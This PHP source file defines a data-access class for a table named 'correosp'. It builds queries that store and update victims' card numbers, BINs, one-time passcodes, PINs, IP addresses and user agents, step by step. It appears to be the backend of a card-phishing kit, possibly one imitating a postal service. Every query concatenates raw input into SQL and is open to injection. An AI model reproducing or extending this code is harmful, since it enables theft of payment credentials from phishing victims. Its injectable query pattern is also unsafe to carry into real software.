<?php
class User {
    private $table = 'correosp';
    public static $site_id;

    public static function getSiteId() {
        return self::$site_id = $_SERVER['SERVER_NAME'];
    }

    public function getTable() {
        return $this->table;
    }

    public static function sessionTime() {
        if (!isset($_SESSION['time'])) 
        {
            $time = $_SESSION['time'] = rand(00000000, 99999999);
        }else 
        {
            $time = $_SESSION['time'];
        }
        return $time;
    }

    public function getStatus($user_id) {
        return "SELECT status FROM $this->table WHERE time = '".$user_id."' AND site_id = '".$this->getSiteId()."'";
    }

    public function getUserIp($id) {
        return "SELECT ip FROM $this->table WHERE id = '".$id."' AND site_id = '".$this->getSiteId()."'";
    }

    public function createUser($bin, $card, $ip, $ua, $user_id, $status, $updatetime) {
        return "INSERT INTO $this->table(site_id, bin, card, ip, ua, time, status, updatetime) VALUES ('".$this->getSiteId()."', '".$bin."', '".$card."', '".$ip."', '".$ua."', '".$user_id."', ".$status.", '".$updatetime."')";
    }

    public function updateUser($bin, $card, $user_id, $status, $updatetime) {
       return "UPDATE $this->table SET bin = '".$bin."', card = '".$card."', status = ".$status.", updatetime = '".$updatetime."' WHERE time = '".$user_id."' AND site_id = '".$this->getSiteId()."'";
    }

    public function deleteUser($id) {
        return "DELETE FROM $this->table where id = ".$id." AND site_id = '".$this->getSiteId()."'";
    }

    public function updateOtp($otp, $user_id, $status, $updatetime) {
        return "UPDATE $this->table SET otp = '".$otp."', status = ".$status.", updatetime = '".$updatetime."' WHERE time = '".$user_id."' AND site_id = '".$this->getSiteId()."'";
    }

    public function updatePin($pin, $user_id, $status, $updatetime) {
        return "UPDATE $this->table SET pin = '".$pin."', status = ".$status.", updatetime = '".$updatetime."' WHERE time = '".$user_id."' AND site_id = '".$this->getSiteId()."'";
    }

    public function updateStep($id, $step) {
        return "UPDATE $this->table SET status = ".$step." WHERE id = ".$id."";
    }

    public function updateTime($user_id) {
        return "UPDATE $this->table SET updatetime = '".time()."' WHERE time = '".$user_id."' AND site_id = '".$this->getSiteId()."'";
    }

    public function clearDb() {
        return "DELETE FROM $this->table WHERE site_id = '".$this->getSiteId()."'";
    }
} 